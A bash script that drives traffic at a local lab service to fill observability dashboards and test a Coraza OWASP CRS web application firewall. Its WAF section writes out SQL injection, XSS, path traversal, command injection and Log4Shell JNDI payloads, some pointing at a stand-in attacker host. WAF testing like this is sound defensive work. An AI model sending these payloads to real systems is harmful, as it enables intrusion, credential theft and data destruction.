#!/usr/bin/env bash
# =============================================================================
# Traffic Generator — populates Grafana, Jaeger, and Kiali with real data
# Usage: ./traffic-gen.sh [request_count] [host] [gateway_ip]
# Default: 200 requests to demo.lab.local via 172.20.20.21
# =============================================================================

COUNT="${1:-200}"
HOST="${2:-demo.lab.local}"
GW_IP="${3:-172.20.20.21}"   # CHANGEME if you adapted the subnet
BASE="http://$HOST"

BLOCKED=0
WAF_FAIL=0

# If $HOST doesn't resolve (e.g. /etc/hosts not set on this machine), use
# curl's --resolve option to route the request to the IngressGateway IP
# directly while still sending the correct Host header for VirtualService matching.
if getent hosts "$HOST" &>/dev/null; then
  RESOLVE=()
else
  RESOLVE=(--resolve "${HOST}:80:${GW_IP}")
fi

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Traffic Generator  |  target: $BASE  (→ $GW_IP)"
echo "  Normal: $COUNT requests  |  WAF tests: ~25 attacks"
echo "  Rate limit: 100 req/min — normal traffic is batched"
[[ ${#RESOLVE[@]} -gt 0 ]] && echo "  DNS: $HOST not in /etc/hosts — using --resolve $GW_IP"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ── Phase 1: Normal background traffic ──────────────────────────────────────
# Sent in batches of 10 with a small pause to avoid exhausting the rate-limit
# token bucket before the WAF tests run.
echo "[1/3] Normal traffic ($COUNT requests, batched)..."

BATCHES=$(( COUNT / 10 ))
[[ $BATCHES -lt 1 ]] && BATCHES=1

for batch in $(seq 1 "$BATCHES"); do
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/" &
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/" &
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/api/todos" &
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/api/todos" &
  curl -s -o /dev/null "${RESOLVE[@]}" -X POST "$BASE/api/todos" \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"Task $RANDOM\",\"completed\":false}" &
  curl -s -o /dev/null "${RESOLVE[@]}" -X POST "$BASE/api/todos" \
    -H "Content-Type: application/json" \
    -d "{\"title\":\"Task $RANDOM\",\"completed\":false}" &
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/nonexistent-page" &
  curl -s -o /dev/null "${RESOLVE[@]}" -X DELETE "$BASE/api/todos/$((RANDOM % 10 + 1))" &
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/" -H "Accept: application/json" &
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/api/todos" -H "Accept: application/json" &
  wait
  printf "."
  sleep 0.3
done
echo " done ($((BATCHES * 10)) requests)"
echo ""

# ── WAF test helper ──────────────────────────────────────────────────────────
# Runs each test synchronously so output is clean and results are counted.
# Extra curl args (e.g. -X POST -H ...) are passed after the URL.
waf_test() {
  local label="$1"
  local url="$2"
  shift 2
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${RESOLVE[@]}" "$@" "$url" 2>/dev/null)
  [[ -z "$code" ]] && code="000"

  case "$code" in
    403) echo "  ✔ BLOCKED  (403)  $label";  BLOCKED=$((BLOCKED+1)) ;;
    429) echo "  ~ RATELIMIT(429)  $label  ← wait 60s and re-run" ;;
    000) echo "  ? TIMEOUT         $label" ;;
    *)   echo "  ✘ ALLOWED  ($code) $label  ← WAF miss!"; WAF_FAIL=$((WAF_FAIL+1)) ;;
  esac
}

# ── Phase 2: WAF Security Tests ─────────────────────────────────────────────
echo "[2/3] WAF Security Tests (Coraza OWASP CRS)"
echo "      All attacks below should return 403."
echo "      429 = rate-limited, not a WAF result — wait 60s and retry."
echo ""

echo "  ── SQL Injection ────────────────────────────────────────────"
# %27=' %3D== %2C=, %3B=; Common URL-encoded SQLi payloads
waf_test "Classic OR bypass"          "$BASE/?id=1%27+OR+%271%27%3D%271"
waf_test "UNION SELECT extraction"    "$BASE/?id=1+UNION+SELECT+1%2C2%2C3--"
waf_test "Stacked query DROP TABLE"   "$BASE/?q=1%27%3B+DROP+TABLE+users%3B--"
waf_test "Comment obfuscation"        "$BASE/?id=1/**/OR/**/1=1"
waf_test "Time-based blind (SLEEP)"   "$BASE/?id=1+OR+SLEEP(5)"
waf_test "POST body SQLi (JSON)"      "$BASE/api/todos" \
  -X POST -H "Content-Type: application/json" \
  -d '{"title":"x'"'"' OR '"'"'1'"'"'='"'"'1"}'
waf_test "Cookie-based SQLi"          "$BASE/" \
  -H "Cookie: session=1' OR '1'='1"

echo ""
echo "  ── Cross-Site Scripting (XSS) ───────────────────────────────"
# %3C=< %3E=> %28=( %29=)
waf_test "Script tag (URL-encoded)"   "$BASE/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
waf_test "IMG onerror event"          "$BASE/?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
waf_test "SVG onload vector"          "$BASE/?q=%3Csvg+onload%3Dalert(1)%3E"
waf_test "javascript: URI"            "$BASE/?url=javascript%3Aalert%28document.cookie%29"
waf_test "POST body XSS (JSON)"       "$BASE/api/todos" \
  -X POST -H "Content-Type: application/json" \
  -d '{"title":"<script>alert(1)</script>"}'

echo ""
echo "  ── Path Traversal / LFI ─────────────────────────────────────"
waf_test "Unix path traversal"        "$BASE/?file=../../../etc/passwd"
waf_test "URL-encoded traversal"      "$BASE/?file=..%2F..%2F..%2Fetc%2Fpasswd"
waf_test "Double-encoded traversal"   "$BASE/?file=..%252F..%252Fetc%252Fshadow"
waf_test "Null byte injection"        "$BASE/?file=../etc/passwd%00.jpg"

echo ""
echo "  ── Command Injection ────────────────────────────────────────"
# %3B=; %7C=| %24=$ %60=`
waf_test "Semicolon + cat"            "$BASE/?cmd=%3Bcat+/etc/passwd"
waf_test "Pipe + id"                  "$BASE/?cmd=%7Cid"
waf_test "Subshell injection"         "$BASE/?cmd=%24(id)"
waf_test "Backtick injection"         "$BASE/?cmd=%60id%60"

echo ""
echo "  ── Scanner & Tool Detection ─────────────────────────────────"
waf_test "sqlmap user-agent"          "$BASE/" -H "User-Agent: sqlmap/1.7.8"
waf_test "Nikto scanner"              "$BASE/" -H "User-Agent: Nikto/2.1.6"
waf_test "Nessus scanner"             "$BASE/" -H "User-Agent: Nessus SOAP v0.0.1"

echo ""
echo "  ── Log4Shell (CVE-2021-44228) ───────────────────────────────"
# Single-quoted to prevent bash expanding ${...}
waf_test "JNDI in X-Api-Version"      "$BASE/" \
  -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}'
waf_test "JNDI in User-Agent"         "$BASE/" \
  -H 'User-Agent: ${jndi:ldap://attacker.com/a}'
waf_test "Obfuscated JNDI (upper)"    "$BASE/" \
  -H 'X-Forwarded-For: ${${upper:j}ndi:ldap://attacker.com/a}'

echo ""

# ── Phase 3: Noise / error traffic ──────────────────────────────────────────
echo "[3/3] Error/noise traffic (404s, bad methods)..."
for i in $(seq 1 15); do
  curl -s -o /dev/null "${RESOLVE[@]}" "$BASE/nonexistent-$RANDOM" &
  curl -s -o /dev/null "${RESOLVE[@]}" -X PUT "$BASE/api/todos/$i" \
    -H "Content-Type: application/json" -d '{"completed":true}' &
done
wait
echo "      done"

# ── Summary ──────────────────────────────────────────────────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  WAF:  $BLOCKED attack(s) blocked ✔  |  $WAF_FAIL slipped through ✘"
echo ""
echo "  Observability:"
echo "    Grafana:  http://172.20.20.23         → Istio Service Dashboard"
echo "    Kiali:    http://172.20.20.24:20001   → Graph → Namespace: frontend"
echo "    Jaeger:   http://172.20.20.25:16686   → Service: istio-ingressgateway"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
